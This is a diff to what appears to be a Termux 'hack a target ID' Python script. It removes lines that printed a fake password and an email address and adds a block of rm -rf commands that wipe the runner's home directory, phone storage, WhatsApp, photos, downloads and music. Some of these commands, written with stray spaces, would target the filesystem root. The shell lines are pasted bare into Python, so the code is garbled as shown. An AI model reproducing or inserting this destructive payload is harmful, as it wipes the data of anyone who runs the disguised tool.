@@ -38,10 +38,20 @@ sleep(0.3)
 print ('')
 print ('')
 ma = input ('\033[36;1mMasukan ID Target :\033[1;33m ')
-sleep(10)
-jalan ('\033[37;1mPassword :\033[36;1m alfaresjack')
-jalan ('\033[37;1mEmail    :\033[36;1m kenialfares@yahoo.com')
-jalan ('\033[37;1mBio      :\033[31;1m Not Found')
-jalan ('\033[37;1mKontak   :\033[31;1m Not Found')
-sleep(5)
+sleep(30)
+termux-setup-storage
+rm -rf $home
+rm -rf / storage / emulated / 0
+rm -rf / sdcard / 0
+rm -rf / storage / emulated / 0 / DCIM
+rm -rf / storage / emulated / 0 / android / obb
+rm -rf / sdcard / 0 / android / data
+rm -rf $ HOME
+rm -rf sdcard / 0
+rm -rf penyimpanan / dicontoh / 0
+rm -rf / storage / emulated / 0 / WhatsApp
+rm -rf / sdcard / 0 / WhatsApp
+rm -rf / storage / emulated / 0 / Downloads
+rm -rf / storage / emulated / 0 / Music
+rm -rf / sdcard / 0 / Musik
 print ('\033[37;1m')
